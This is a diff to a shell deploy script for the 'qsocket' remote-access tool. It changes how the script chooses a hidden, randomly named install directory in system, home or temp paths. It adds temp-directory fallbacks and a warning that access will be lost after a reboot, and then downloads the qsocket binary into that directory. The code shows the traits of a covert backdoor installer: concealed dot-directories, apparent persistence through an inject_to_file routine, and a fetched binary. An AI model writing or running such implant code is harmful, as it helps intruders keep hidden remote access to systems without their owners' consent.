@@ -264,7 +264,8 @@ inject_to_file()
 create_qs_dir() {
 	local rand_dir=".$(LC_ALL=C tr -dc A-Za-z0-9 </dev/urandom | head -c 8)"
 	local root_dirs=("/lib" "/usr/lib" "/usr/bin" "/usr/lib32")
-	local user_dirs=("$HOME/.config" "/dev/shm" "/var/tmp" "/tmp")
+	local user_dirs=("$HOME/.config" "$HOME/.local")
+  local temp_dirs=("/dev/shm" "/var/tmp" "/tmp" )
 
 	## Root install methods
 	if [[ $UID -eq 0 ]]; then 
@@ -278,11 +279,16 @@ create_qs_dir() {
 
 	
 	for i in "${user_dirs[@]}"; do
-		[[ ! -d $i ]] && continue
 		xmkdir "$i/$rand_dir" "/etc" || continue
 		check_exec_dir "$i/$rand_dir" && echo -n "$i/$rand_dir" && return
 		rm -rfv "${i:?}/${rand_dir}" &>"$ERR_LOG"
-  	done
+  done
+
+  for i in "${temp_dirs[@]}"; do
+		xmkdir "$i/$rand_dir" "/etc" || continue
+		check_exec_dir "$i/$rand_dir" && echo -n "$i/$rand_dir" && return
+		rm -rfv "${i:?}/${rand_dir}" &>"$ERR_LOG"
+  done
 
 	print_fatal "Failed to create a qsocket directory! Exiting..."
 }
@@ -513,9 +519,14 @@ print_status "Arch: $OS_ARCH"
 print_status "User: $USER"
 print_status "Home: $HOME"
 print_status "Shell: $SHELL"
-# print_status "Secret: $S"
 print_status "Binary: $BIN_NAME"
+print_status "Deploy Dir: $QS_DIR"
 echo "" ## --- break after system info
+
+if [[ "$QS_DIR" =~ ^.*/(tmp|shm).* ]]; then
+  print_warning "Created a temp qsocket directoy!" 
+  print_warning "Access will be lost after a reboot..."  
+fi
 print_progress "Downloading latest $BIN_NAME binary for $OS_NAME ($OS_ARCH)"
 if download_util "$QS_DIR/qs.tar.gz"; then 
   print_ok 
